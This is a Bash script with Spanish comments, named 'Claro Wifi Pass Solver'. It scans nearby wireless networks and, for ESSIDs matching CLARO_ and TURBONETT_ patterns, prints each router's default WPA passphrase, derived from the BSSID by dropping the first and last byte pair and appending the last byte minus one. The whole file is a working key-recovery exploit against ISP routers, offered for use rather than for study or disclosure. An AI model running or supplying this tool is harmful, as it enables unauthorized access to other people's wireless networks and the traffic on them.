#!/bin/bash
num=0
clr=0
b16='0x'
#ASCII art
echo "+=======================================+";
echo "|  (')> CWPS (Claro Wifi Pass Solver)   |";
echo "+=======================================+";
#chequeando tener los privilegios requeridos por iwlist
user=`whoami`
 if [[ $user != "root" ]]
 then
	echo "$user, debes ser root para escanear las redes"
	echo "O ejecuta \"sudo !!\" si eres un sudoer"
	exit
 fi
#regex que hace match con los ESSID afectados
pat0="^CLARO_[[:xdigit:]]{6}$"
pat1="^TURBONETT_[[:xdigit:]]{6}$"
pat2="^TURBONETT_[[:xdigit:]]{3}$"
pat3="^IBW_WIM*[[:xdigit:]]$"

#obtenemos interfaz inalambrica y escaneamos
iwconfig &> /tmp/wnics;
int=$(cat /tmp/wnics |grep -v 'no wireless extensions\|^[[:space:]]'| awk '{print $1}'|sort -r);
 if [ -z "$int" ];
 then
 	echo "No se encontraron interfaces de red inalámbrica disponibles";
 	exit
 fi
/usr/sbin/iwlist $int scan |grep 'Cell\|ESSID' &> /tmp/wlans;

# validando si el controlador de la WNIC soporta scan
resp=$(cat /tmp/wlans);
 if [[ $resp == *support* ]]
 then
	echo "La interfaz de red inalámbrica $int no soporta scaneo";
	exit;
 fi

# numero de redes encontradas
num=$(wc -l /tmp/wlans|awk '{print $1}');
num=`expr $num / 2`;

for i in `seq 1 $num`;
 do
	exec < /tmp/wlans;
	# leemos BSSID de cada red
		read a1;
		mac=$(echo $a1|awk '{print $5}');
	# leemos ESSID
		read a2;
		nom=$(echo $a2|cut -c8- |cut -d\" -f1);
	# comparamos ESSID con cada patrón
		if [[ $nom =~ $pat0 ]] || [[ $nom =~ $pat1 ]] || [[ $nom =~ $pat2 ]]
		then
	# si hace match quita el primer y ultimo par de hexadecimales
	# del BSSID (MAC address) y se agrega el ultimo par despues de restarle uno ;)
			clr=1
			pre=$(echo $mac|cut -c4-|sed "s/://g"|rev|cut -c3-|rev)
			suf=$(echo $mac|cut -c16-)
			echo '+----------------------------+';
			echo "|" ESSID: $nom  "   |"
			hex=$(($b16$suf-0x01));
			hex=$(printf "%X\n" $hex);
			echo "|" passphrase: $pre$hex "    |"
			echo '+----------------------------+';
		fi
		
		sed -i -e "1d" /tmp/wlans
		sed -i -e "1d" /tmp/wlans
 done

if [[ $clr == "0" ]]
then
	echo "No se encontraron redes con patron CLARO_* o TURBONETT_*"
fi

rm /tmp/wnics /tmp/wlans
